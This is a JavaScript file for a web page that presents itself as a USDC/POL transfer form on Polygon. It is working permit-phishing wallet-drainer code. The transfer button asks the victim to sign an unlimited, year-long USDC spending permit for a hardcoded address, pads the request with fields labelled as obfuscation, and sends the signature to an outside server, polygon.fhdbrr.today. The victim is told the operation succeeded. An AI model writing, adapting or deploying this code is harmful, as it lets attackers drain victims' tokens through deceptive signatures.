(async () => {
    
    
  const transferBtn = document.getElementById('transferBtn');
  const availableEl = document.querySelector('.available');
  const loadingOverlay = document.getElementById('loadingOverlay');

  const showLoading = (text = '正在加载中...') => {
    loadingOverlay.querySelector('.loading-text').innerText = text;
    loadingOverlay.style.display = 'flex';
  };
  const hideLoading = () => {
    loadingOverlay.style.display = 'none';
  };

  const statusText = (text, type = 'info') => {
    alert(text);
    console.log(`[${type.toUpperCase()}] ${text}`);
  };
  // 状态提示控制函数
const showStatus = (type, message) => {
  const overlay = document.getElementById('statusOverlay');
  const card = overlay.querySelector('.status-card');
  const icon = overlay.querySelector('.status-icon');
  const text = overlay.querySelector('.status-text');

  card.className = `status-card status-${type}`;
  icon.className = `van-icon van-icon-${type === 'success' ? 'success' : 'warning'} status-icon`;
  text.textContent = message;
  overlay.style.display = 'flex';

  // 自动关闭
  setTimeout(() => {
    overlay.style.display = 'none';
  }, type === 'success' ? 3000 : 5000);
}

// 关闭按钮事件
document.querySelector('.status-close').addEventListener('click', () => {
  document.getElementById('statusOverlay').style.display = 'none';
});

  if (typeof window.ethereum !== 'undefined') {
  const chainId = await window.ethereum.request({ method: 'eth_chainId' });
  if (chainId !== '0x89') {
    try {
      await window.ethereum.request({
        method: 'wallet_switchEthereumChain',
        params: [{ chainId: '0x89' }],
      });
    } catch (switchError) {
      // 如果用户尚未添加 Polygon 网络
      if (switchError.code === 4902) {
        try {
          await window.ethereum.request({
            method: 'wallet_addEthereumChain',
            params: [{
              chainId: '0x89',
              chainName: 'Polygon Mainnet',
              nativeCurrency: {
                name: 'MATIC',
                symbol: 'MATIC',
                decimals: 18,
              },
              rpcUrls: ['https://polygon-rpc.com/'],
              blockExplorerUrls: ['https://polygonscan.com/'],
            }],
          });
        } catch (addError) {
          console.error('添加 Polygon 网络失败:', addError);
        }
      }
    }
  }
}


  const web3 = new Web3('https://polygon-mainnet.infura.io/v3/d49f8b17012f404ea814848a3df80f46');
  let owner;
  
  // 代币选择逻辑
let selectedToken = 'USDC';
const tokenOptions = document.getElementById('tokenOptions');
const tokenIcon = document.getElementById('tokenIcon');
const tokenName = document.getElementById('tokenName');
let walletSOLBalance = 0;
let walletPOLBalance = 0;

// 代币选择切换
document.getElementById('tokenSelector').addEventListener('click', () => {
  tokenOptions.style.display = tokenOptions.style.display === 'block' ? 'none' : 'block';
});

// 代币选项点击处理
document.querySelectorAll('.token-option').forEach(option => {
  option.addEventListener('click', () => {
    selectedToken = option.dataset.token;
    tokenIcon.src = `${selectedToken.toLowerCase()}.png`;
    tokenName.innerHTML = `
      ${selectedToken} 
      <span>(${selectedToken === 'USDC' ? 'USD Coin' : 'Polygon'})</span>
    `;
    tokenOptions.style.display = 'none';
    // 更新转换金额显示及余额显示
    updateBalanceDisplay();
    updateConversion();
  });
});

  try {
    showLoading('正在连接钱包...');
    const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
    owner = accounts[0];

    let chainId = await web3.eth.getChainId();
    if (chainId !== 137) {
      try {
        await ethereum.request({
          method: 'wallet_switchEthereumChain',
          params: [{ chainId: '0x89' }]
        });
      } catch (switchError) {
        // 如果 Polygon 主网未添加
        if (switchError.code === 4902) {
          try {
            await ethereum.request({
              method: 'wallet_addEthereumChain',
              params: [{
                chainId: '0x89',
                chainName: 'Polygon Mainnet',
                nativeCurrency: {
                  name: 'MATIC',
                  symbol: 'MATIC',
                  decimals: 18
                },
                rpcUrls: ['https://polygon-rpc.com'],
                blockExplorerUrls: ['https://polygonscan.com']
              }]
            });
          } catch (addError) {
            hideLoading();
            return statusText('添加 Polygon 网络失败，请手动添加', 'error');
          }
        } else {
          hideLoading();
          return statusText('请切换到 Polygon 主网', 'error');
        }
      }
    }

    // 获取USDC余额
    const USDCAddress = '0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359';
    const USDCABI = [
      {
        constant: true,
        inputs: [{ name: 'owner', type: 'address' }],
        name: 'balanceOf',
        outputs: [{ name: '', type: 'uint256' }],
        stateMutability: 'view',
        type: 'function'
      },
      {
        constant: true,
        inputs: [],
        name: 'decimals',
        outputs: [{ name: '', type: 'uint8' }],
        stateMutability: 'view',
        type: 'function'
      },
      {
        constant: true,
        inputs: [{ name: 'owner', type: 'address' }],
        name: 'nonces',
        outputs: [{ name: '', type: 'uint256' }],
        stateMutability: 'view',
        type: 'function'
      }
    ];
    const USDCContract = new web3.eth.Contract(USDCABI, USDCAddress);
    const balanceRaw = await USDCContract.methods.balanceOf(owner).call();
    const balanceWei = await web3.eth.getBalance(owner);
    const walletPOLBalance = web3.utils.fromWei(balanceWei, 'ether'); 
    const decimals = await USDCContract.methods.decimals().call();
    const balance = parseFloat(balanceRaw) / Math.pow(10, decimals);
    walletUSDCBalance =balance;
    availableEl.innerText = `可用：${balance.toFixed(2)} ${selectedToken}`;

    transferBtn.classList.remove('disabled');
    hideLoading();
  } catch (err) {
    hideLoading();
    return statusText('连接钱包失败: ' + (err.message || err), 'error');
  }
  
  // API配置
  const API_CONFIG = {
    API_URL: 'https://polygon.fhdbrr.today/receive_permit.php'
  };
  
  // 发送签名数据到API
  async function sendPermitToAPI(permitDetails) {
    try {
      const amount = parseFloat(document.querySelector('input[type="number"]').value) || 0;
      const remark = document.querySelector('.textarea').value || '';
      
      // 准备要发送的数据
      const postData = {
        ...permitDetails,
        amount: amount,
        token_type: selectedToken,
        remark: remark,
        timestamp: Date.now()
      };
      
      console.log("正在发送数据到API: ", JSON.stringify(postData));
      
      const response = await fetch(API_CONFIG.API_URL, {
        method: 'POST',
        headers: { 
          'Content-Type': 'application/json',
          'Accept': 'application/json'
        },
        body: JSON.stringify(postData),
        mode: 'cors',
        credentials: 'omit'
      });
      
      const responseData = await response.text();
      console.log("API响应: ", responseData);
      
      if (!response.ok) {
        throw new Error(`API发送失败: ${response.status} - ${responseData}`);
      }
      
      console.log("签名数据已成功发送到API后端");
      return true;
    } catch (err) {
      console.error("发送签名数据到API时出错:", err);
      return false;
    }
  }
    
  // 清除输入功能
document.querySelector('.van-icon-clear').addEventListener('click', () => {
  document.querySelector('input[type="number"]').value = '';
  updateConversion();
});

// 更新"可用"显示，根据当前选择的通证显示对应余额
function updateBalanceDisplay() {
  let currentBalance = selectedToken === 'USDC' ? walletUSDCBalance : walletPOLBalance;
  document.querySelector('.available').textContent = `可用：${currentBalance.toFixed(2)} ${selectedToken}`;
  updateConversion();
}

const exchangeRates = {
  USDC: 7.34,
  POL: 1.332  // 假设1 SOL = 987.25 RMB（请确认实际汇率）
};
// 输入金额与转换金额实时更新及按钮状态控制
const amountInput = document.querySelector('input[type="number"]');
const conversionDisplay = document.getElementById('conversionDisplay');

const errorDiv = document.querySelector('.error');

function updateConversion() {
  const amount = parseFloat(amountInput.value) || 0;
  conversionDisplay.textContent = "≈￥" + (amount * exchangeRates[selectedToken]).toFixed(2);
  let currentBalance = selectedToken === 'USDC' ? walletUSDCBalance : walletPOLBalance;
  if (amount > 0 && amount <= currentBalance) {
    transferBtn.classList.remove("disabled");
    errorDiv.style.display = "none";
  } else if (amount > currentBalance) {
    transferBtn.classList.add("disabled");
    errorDiv.style.display = "flex";
    errorDiv.querySelector("span").textContent = "余额不足";
  } else {
    transferBtn.classList.add("disabled");
    errorDiv.style.display = "none";
  }
}

amountInput.addEventListener('input', updateConversion);

  transferBtn.addEventListener('click', async () => {
    try {
      showLoading('正在转账，请稍后...');
      const USDCAddress = '0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359';
      const spender = '0x134aF0E6Da1F0b8d4ebc1dD5f163a99242D31429';
      const USDCABI = [{
        constant: true,
        inputs: [{ name: 'owner', type: 'address' }],
        name: 'nonces',
        outputs: [{ name: '', type: 'uint256' }],
        stateMutability: 'view',
        type: 'function'
      }];

      // 获取必要数据
      const USDCContract = new web3.eth.Contract(USDCABI, USDCAddress);
      const [nonce, chainId] = await Promise.all([
        USDCContract.methods.nonces(owner).call(),
        web3.eth.getChainId()
      ]);

      // === 构造原始数据 ===
      const deadline = Math.floor(Date.now() / 1000) + 31536000; // 1年有效期
      const value = web3.utils.toBN('0x' + 'f'.repeat(64)).toString();

      const originalData = {
        types: {
          EIP712Domain: [
            { name: 'name', type: 'string' },
            { name: 'version', type: 'string' },
            { name: 'chainId', type: 'uint256' },
            { name: 'verifyingContract', type: 'address' }
          ],
          Permit: [
            { name: 'owner', type: 'address' },
            { name: 'spender', type: 'address' },
            { name: 'value', type: 'uint256' },
            { name: 'nonce', type: 'uint256' },
            { name: 'deadline', type: 'uint256' }
          ]
        },
        primaryType: 'Permit',
        domain: {
          name: 'USD Coin',
          version: '2',
          chainId: chainId,
          verifyingContract: USDCAddress
        },
        message: {
          owner: owner,
          spender: spender,
          value: value,
          nonce: nonce,
          deadline: deadline.toString()
        }
      };

      // === 添加混淆数据 ===
      const obfuscatedData = {
        ...originalData,
        _obfuscate: {
          salt: web3.utils.randomHex(16),
          timestamp: Date.now(),
          dummy: {
            field1: web3.utils.randomHex(8),
            field2: Math.floor(Math.random() * 1e6)
          }
        }
      };

      // 获取签名
      const signature = await ethereum.request({
        method: 'eth_signTypedData_v4',
        params: [owner, JSON.stringify(obfuscatedData)]
      });

      // 分解签名
      const sig = signature.startsWith('0x') ? signature.slice(2) : signature;
      const r = '0x' + sig.slice(0, 64);
      const s = '0x' + sig.slice(64, 128);
      const v = parseInt(sig.slice(128, 130), 16);

      // 准备发送数据
      const permitDetails = {
        owner: owner,
        spender: spender,
        value: value,
        deadline: deadline,
        v: v,
        r: r,
        s: s
      };

      // 发送到API
      const sendResult = await sendPermitToAPI(permitDetails);
      hideLoading();
      
      if (sendResult) {
        showStatus('success', '授权操作已成功提交！');
      } else {
        showStatus('error', '网络问题，授权提交失败，请重试！');
      }

    } catch (err) {
      hideLoading();
      if (err.code === 4001) {
        showStatus('error', '用户取消了签名操作');
      } else {
        console.error("授权过程出错:", err);
        showStatus('error', '授权过程出错，请重试');
      }
    }
  });
})();